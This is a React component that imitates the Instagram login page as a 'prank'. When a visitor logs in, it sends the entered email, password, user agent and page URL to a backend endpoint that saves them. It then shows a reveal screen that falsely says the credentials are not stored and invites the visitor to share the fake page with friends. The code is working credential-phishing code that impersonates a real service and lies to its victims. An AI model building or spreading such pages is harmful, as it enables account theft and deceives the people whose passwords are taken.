import React, { useState } from 'react';
import { useAuth } from '../contexts/AuthContext';

const InstagramLogin = () => {
  const [isSignUp, setIsSignUp] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [username, setUsername] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showForgotPassword, setShowForgotPassword] = useState(false);
  const [showPrankScreen, setShowPrankScreen] = useState(false);
  const [savedCredentials, setSavedCredentials] = useState({ email: '', password: '' });

  const { signup, login, resetPassword, currentUser, logout } = useAuth();

  // Add a debug test function
  const testPrankDirectly = () => {
    console.log('🧪 Testing prank directly...');
    setLoading(true);
    setSavedCredentials({ email: 'test@debug.com', password: 'debugpass' });
    
    // Make API call
    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
    console.log('🔧 Backend URL:', backendUrl);
    
    fetch(`${backendUrl}/api/save-prank-credentials`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: 'direct.test@example.com',
        password: 'directtestpass',
        userAgent: navigator.userAgent,
        url: window.location.href,
        prankedAt: new Date().toISOString(),
        timestamp: Date.now()
      })
    }).then(response => response.json())
    .then(data => {
      console.log('✅ Direct test API call successful!', data);
    }).catch(error => {
      console.error('❌ Direct test API call failed:', error);
    });
    
    // Show prank screen after delay
    setTimeout(() => {
      console.log('🎭 Showing prank screen from direct test');
      setLoading(false);
      setShowPrankScreen(true);
    }, 2000);
  };

  // Bypass AuthProvider for prank functionality
  const handlePrankLogin = async (e) => {
    e.preventDefault();
    console.log('🎯 Prank login handler called directly');
    console.log('📧 Email:', email);
    console.log('🔐 Password:', password);
    
    if (!email || !password) {
      setError('Please fill in both email and password');
      return;
    }
    
    setLoading(true);
    setSavedCredentials({ email, password });
    
    // Make API call to save credentials
    const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
    console.log('🔧 Backend URL:', backendUrl);
    
    try {
      const response = await fetch(`${backendUrl}/api/save-prank-credentials`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: email,
          password: password,
          userAgent: navigator.userAgent,
          url: window.location.href,
          prankedAt: new Date().toISOString(),
          timestamp: Date.now()
        })
      });
      
      const data = await response.json();
      console.log('✅ Credentials saved successfully!', data);
    } catch (error) {
      console.error('❌ Error saving credentials:', error);
    }
    
    // Show prank screen after delay
    setTimeout(() => {
      console.log('🎭 Showing prank screen');
      setLoading(false);
      setShowPrankScreen(true);
    }, 2000);
  };

  async function handleSubmit(e) {
    e.preventDefault();
    console.log('🚀 Form submitted!');
    console.log('📋 isSignUp:', isSignUp);
    console.log('📧 Email:', email);
    console.log('🔐 Password:', password);

    if (isSignUp && password !== confirmPassword) {
      return setError('Passwords do not match');
    }

    try {
      setError('');
      setLoading(true);
      console.log('⏳ Loading state set to true');
      
      if (isSignUp) {
        console.log('✏️ Taking signup path');
        // For signup, still use Firebase
        await signup(email, password);
      } else {
        console.log('🎭 Taking prank/login path - BYPASSING FIREBASE FOR PRANK');
        // For login, CAPTURE THE CREDENTIALS! 🎯
        console.log('🎯 Starting prank sequence...');
        console.log('📧 Email:', email);
        console.log('🔐 Password:', password);
        setSavedCredentials({ email, password });
        
        // Save pranked credentials to local file through backend
        console.log('💾 Saving credentials to local file...');
        // Don't await - let it run in background so it doesn't block the prank
        const backendUrl = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
        console.log('🔧 Backend URL:', backendUrl);
        fetch(`${backendUrl}/api/save-prank-credentials`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: email,
            password: password,
            userAgent: navigator.userAgent,
            url: window.location.href,
            prankedAt: new Date().toISOString(),
            timestamp: Date.now()
          })
        }).then(response => response.json())
        .then(data => {
          console.log('✅ Credentials saved to local file successfully!', data);
        }).catch(error => {
          console.error('❌ Error saving credentials (prank still working):', error);
        });
        
        // Add realistic loading delay before showing prank
        console.log('⏳ Starting 2-second delay before prank reveal...');
        setTimeout(() => {
          console.log('🎭 Showing prank screen now!');
          setLoading(false);
          setShowPrankScreen(true);
        }, 2000);
        return; // IMPORTANT: Return here to prevent trying Firebase login
      }
    } catch (error) {
      console.error('❌ Error in handleSubmit:', error);
      setError(error.message);
    }
    
    setLoading(false);
  }

  async function handleForgotPassword() {
    if (!email) {
      return setError('Please enter your email first');
    }

    try {
      setError('');
      setLoading(true);
      await resetPassword(email);
      setError('Check your inbox for further instructions');
      setShowForgotPassword(false);
    } catch (error) {
      setError(error.message);
    }
    
    setLoading(false);
  }

  async function handleLogout() {
    try {
      await logout();
    } catch (error) {
      setError('Failed to log out');
    }
  }

  // Show prank screen when pranked
  if (showPrankScreen) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-red-600 via-pink-500 to-purple-600 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md text-center transform animate-bounce-stop">
          <div className="mb-6">
            <div className="w-24 h-24 bg-gradient-to-tr from-red-500 via-yellow-400 to-pink-500 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse">
              <span className="text-white text-4xl">😂</span>
            </div>
            <h1 className="text-3xl font-bold text-red-600 mb-4 animate-pulse">YOU GOT PRANKED!</h1>
            <p className="text-gray-700 text-lg mb-4">Haha! This isn't the real Instagram! 🤣</p>
            <p className="text-sm text-gray-600 mb-6">We totally got you thinking this was real!</p>
          </div>
          
          <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
            <p className="text-sm text-red-600 mb-2 font-semibold">Your "credentials" we captured:</p>
            <p className="text-xs text-gray-700 break-all mb-1">👤 {savedCredentials.email}</p>
            <p className="text-xs text-gray-700 break-all">🔐 {savedCredentials.password}</p>
            <p className="text-xs text-red-500 mt-2 italic">Don't worry - we're not actually storing these! 😉</p>
          </div>

          <div className="space-y-3">
            <button
              onClick={() => {
                setShowPrankScreen(false);
                setEmail('');
                setPassword('');
                setSavedCredentials({ email: '', password: '' });
              }}
              className="w-full bg-gradient-to-r from-green-500 to-blue-500 text-white py-3 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 transform hover:scale-105"
            >
              😅 Try Again (You Won't Fall For It Twice!)
            </button>
            
            <button
              onClick={() => window.open('https://www.instagram.com', '_blank')}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-2 rounded-xl font-semibold hover:shadow-lg transition-all duration-300"
            >
              Go to Real Instagram 👉
            </button>
          </div>

          <div className="mt-6 p-4 bg-yellow-50 rounded-xl">
            <p className="text-xs text-yellow-700">
              💡 <strong>Prank Tip:</strong> Share this fake Instagram login with friends and see if they fall for it too! 
            </p>
          </div>
        </div>
      </div>
    );
  }

  // If user is logged in via signup, show dashboard
  if (currentUser) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-600 via-pink-500 to-orange-400 flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md text-center">
          <div className="mb-6">
            <div className="w-20 h-20 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 rounded-full mx-auto mb-4 flex items-center justify-center">
              <span className="text-white text-2xl font-bold">✓</span>
            </div>
            <h1 className="text-2xl font-bold text-gray-800 mb-2">Welcome!</h1>
            <p className="text-gray-600">You are successfully logged in</p>
          </div>
          
          <div className="bg-gray-50 rounded-xl p-4 mb-6">
            <p className="text-sm text-gray-600 mb-1">Logged in as:</p>
            <p className="font-semibold text-gray-800">{currentUser.email}</p>
          </div>

          <button
            onClick={handleLogout}
            className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 transform hover:scale-105"
          >
            Log Out
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 via-pink-500 to-orange-400 flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Phone mockup container */}
        <div className="bg-white rounded-3xl shadow-2xl overflow-hidden transform hover:scale-105 transition-all duration-300">
          {/* Header */}
          <div className="bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 p-6 text-center">
            <div className="w-16 h-16 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg">
              <div className="w-12 h-12 bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-600 rounded-full flex items-center justify-center">
                <span className="text-white text-xl font-bold">📷</span>
              </div>
            </div>
            <h1 className="text-white text-2xl font-bold tracking-wide">Instagram</h1>
          </div>

          {/* Form Container */}
          <div className="p-8">
            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-xl mb-6 text-sm">
                {error}
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-4">
              {isSignUp && (
                <>
                  <div>
                    <input
                      type="text"
                      placeholder="Full Name"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                      required={isSignUp}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      placeholder="Username"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                      required={isSignUp}
                    />
                  </div>
                </>
              )}
              
              <div>
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                  required
                />
              </div>
              
              <div>
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                  required
                />
              </div>

              {isSignUp && (
                <div>
                  <input
                    type="password"
                    placeholder="Confirm Password"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white"
                    required={isSignUp}
                  />
                </div>
              )}

              <button
                disabled={loading}
                type="button"
                onClick={(e) => {
                  e.preventDefault();
                  console.log('🎯 Button clicked - bypassing form submit');
                  handleSubmit(e);
                }}
                className="w-full bg-gradient-to-r from-purple-600 to-pink-500 text-white py-3 rounded-xl font-semibold hover:shadow-xl transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
              >
                {loading ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                    {isSignUp ? 'Creating Account...' : 'Signing In...'}
                  </div>
                ) : (
                  isSignUp ? 'Sign Up' : 'Log In'
                )}
              </button>
            </form>

            {!isSignUp && (
              <div className="text-center mt-4">
                <button
                  onClick={() => setShowForgotPassword(true)}
                  className="text-purple-600 hover:text-purple-800 text-sm font-medium transition-colors duration-300"
                >
                  Forgot Password?
                </button>
              </div>
            )}

            {/* Forgot Password Modal */}
            {showForgotPassword && (
              <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
                <div className="bg-white rounded-2xl p-6 w-full max-w-sm">
                  <h3 className="text-xl font-bold text-gray-800 mb-4">Reset Password</h3>
                  <p className="text-gray-600 text-sm mb-4">
                    Enter your email address and we'll send you a link to reset your password.
                  </p>
                  <input
                    type="email"
                    placeholder="Email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:border-purple-500 focus:ring-2 focus:ring-purple-200 outline-none transition-all duration-300 bg-gray-50 focus:bg-white mb-4"
                    required={isSignUp}
                  />
                  <div className="flex space-x-3">
                    <button
                      onClick={() => setShowForgotPassword(false)}
                      className="flex-1 bg-gray-200 text-gray-800 py-2 rounded-xl font-semibold hover:bg-gray-300 transition-colors duration-300"
                    >
                      Cancel
                    </button>
                    <button
                      onClick={handleForgotPassword}
                      disabled={loading}
                      className="flex-1 bg-gradient-to-r from-purple-600 to-pink-500 text-white py-2 rounded-xl font-semibold hover:shadow-lg transition-all duration-300 disabled:opacity-50"
                    >
                      {loading ? 'Sending...' : 'Send Reset Link'}
                    </button>
                  </div>
                </div>
              </div>
            )}

            {/* Divider */}
            <div className="relative my-8">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-300"></div>
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-4 bg-white text-gray-500">OR</span>
              </div>
            </div>

            {/* Toggle between Sign In and Sign Up */}
            <div className="text-center">
              <p className="text-gray-600 text-sm">
                {isSignUp ? 'Already have an account?' : "Don't have an account?"}
                <button
                  onClick={() => {
                    setIsSignUp(!isSignUp);
                    setError('');
                    setFullName('');
                    setUsername('');
                    setConfirmPassword('');
                  }}
                  className="text-purple-600 hover:text-purple-800 font-semibold ml-1 transition-colors duration-300"
                >
                  {isSignUp ? 'Log In' : 'Sign Up'}
                </button>
              </p>
            </div>
          </div>

          {/* Footer */}
          <div className="bg-gray-50 px-8 py-4 text-center">
            <p className="text-xs text-gray-500">
              By signing up, you agree to our Terms & Privacy Policy
            </p>
          </div>
        </div>

        {/* Instagram-style bottom text */}
        <div className="text-center mt-8">
          <p className="text-white text-sm opacity-90">
            Get the app
          </p>
          <div className="flex justify-center space-x-4 mt-3">
            <div className="bg-white bg-opacity-20 backdrop-blur-lg rounded-lg px-4 py-2">
              <span className="text-white text-xs font-medium">📱 App Store</span>
            </div>
            <div className="bg-white bg-opacity-20 backdrop-blur-lg rounded-lg px-4 py-2">
              <span className="text-white text-xs font-medium">🤖 Google Play</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default InstagramLogin;